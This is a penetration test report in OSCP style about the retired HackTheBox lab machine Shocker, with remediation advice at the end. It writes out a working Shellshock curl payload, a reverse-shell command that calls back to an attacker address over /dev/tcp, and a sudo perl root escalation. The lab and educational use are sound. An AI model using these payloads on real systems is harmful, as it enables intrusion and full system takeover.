# HTB Shocker - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2025-12-15

---

## 0. Lesson Learned

Dirbuster's `directory-2.3-medium.txt` list is excessively long and may return false negatives. Use `dirb/common.txt` for initial web enumeration instead.

---

## 1. Executive Summary

The target system was found to be vulnerable to **unauthenticated remote command execution** via the **Shellshock (CVE-2014-6271)** vulnerability affecting a Bash CGI script exposed through the web server. Exploitation of this issue allowed an attacker to obtain a reverse shell as a low-privileged user. Further enumeration revealed misconfigured `sudo` permissions, enabling **privilege escalation to root** without authentication.

**Impact:** Complete system compromise.

---

## 2. Scope

- **Target:** 10.129.12.199
- **Environment:** HackTheBox Shocker (Retired Machine)
- **Testing Window:** 2025-12-12 to 2025-12-15
- **Objective:** Obtain user-level and root-level access

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Vulnerability Analysis
- Exploitation
- Privilege Escalation
- Post-Exploitation

---

## 4. Information Gathering

A full TCP port scan was performed with Nmap.

```
nmap -p- -sCV 10.129.12.199 -T4 -oA shocker_initial
```

Identifying the following open services:

| Port | Service | Version |
|------|---------|---------|
| 80 | HTTP | Apache 2.4.18 |
| 2222 | SSH | OpenSSH 7.2p2 |

UDP scanning revealed no services relevant to exploitation.

---

## 5. Web Enumeration

Directory enumeration was performed with Gobuster. Initial scans with large wordlists missed key directories due to HTTP 403 filtering. Subsequent enumeration using smaller, focused wordlists revealed a restricted CGI directory `/cgi-bin/`.

```
gobuster dir -u http://10.129.12.199 -w /usr/share/wordlists/dirb/common.txt
```

Further enumeration of executable file extensions within the restricted CGI directory identified an accessible Bash script `/cgi-bin/user.sh`.

```
gobuster dir -u http://10.129.12.199/cgi-bin -w /usr/share/wordlists/dirb/common.txt -x sh,cgi,pl,py
```

Accessing this file returned plaintext output indicating execution of system commands (`uptime`), confirming it was an active CGI Bash script.

---

## 6. Vulnerability Identification

### Shellshock (CVE-2014-6271)

#### Description

Shellshock is a critical vulnerability in Bash where crafted environment variables can lead to arbitrary command execution. CGI scripts written in bash are particularly susceptible, as HTTP headers are passed directly to the environment.

#### Evidence:

- Bash script located in `/cgi-bin/`
- Script executed system commands
- Apache version consistent with vulnerable configurations

---

## 7. Exploitation

### Remote Command Execution

The vulnerability was confirmed by injecting a malicious function definition via the `User-Agent` HTTP header:

```
curl -H 'User-Agent: () { :; }; echo; /bin/bash -c "id"' http://10.129.12.199/cgi-bin/user.sh
```

The command executed successfully, returning user identity information and confirming arbitrary command execution.

### Reverse Shell

A `bash -i` reverse shell was established using the same attack vector:

```
curl -H 'User-Agent: () { :; }; echo; /bin/bash -c "sh -i >& /dev/tcp/10.10.14.11/443 0>&1"' http://10.129.12.199/cgi-bin/user.sh
```

This provided an interactive shell as the user `shelly`.

---

## 8. Privilege Escalation

### Sudo Misconfiguration

Enumeration of sudo permissions revealed the execution of `/usr/bin/perl` as root without a password:

```
sudo -l
```

### Root Access

Root access was obtained using:

```
sudo /usr/bin/perl -e 'exec "/bin/sh";'
```

Successful escalation was confirmed by verifying the effective user ID.

---

## 9. Post-Exploitation

### User Flag - *REDACTED*

```
cat /home/shelly/user.txt
```

### Root Flag - *REDACTED*

```
cat /root/root.txt
```

---

## 10. Risk Assessment

| Vulnerability | Severity | Description | Result |
|---------------|----------|-------------|--------|
| Shellshock RCE (CVE-2014-6271) | Critical | Incorrect parsing of environmental variables in Bash allows attackers to execute remote code on affected systems | Initial foothold with low-privileged access |
| Sudo misconfiguration | High | A misconfigured sudo permission allowed privilege escalation through execution of Perl as root without a password | Full system compromise as root |

---

## 11. Recommendations

1. Remove or restrict CGI scripts where not required.
2. Update Bash to a patched version.
3. Disable execution permissions on web-accessible scripts.
4. Audit sudo permissions and remove unnecessary NOPASSWD entries.
5. Apply least-privilege principles to service accounts.

---

## 12. Conclusion

The HTB Shocker host was fully compromised through a well-known but severe vulnerability in a CGI Bash script, compounded by insecure privilege escalation controls. Exploitation required no authentication and resulted in complete root access.

---

## 13. Appendix

### Resources Used:

Testing Shellshock CVE-2014-6271:
[https://github.com/DrHaitham/CVE-2014-6271-Shellshock-?tab=readme-ov-file#4-exploiting-shellshock-with-curl](https://github.com/DrHaitham/CVE-2014-6271-Shellshock-?tab=readme-ov-file#4-exploiting-shellshock-with-curl)

Bash -i Reverse Shell:
[https://www.revshells.com/](https://www.revshells.com/)

Perl Sudo Privesc Command:
[https://gtfobins.github.io/gtfobins/perl/#sudo](https://gtfobins.github.io/gtfobins/perl/#sudo)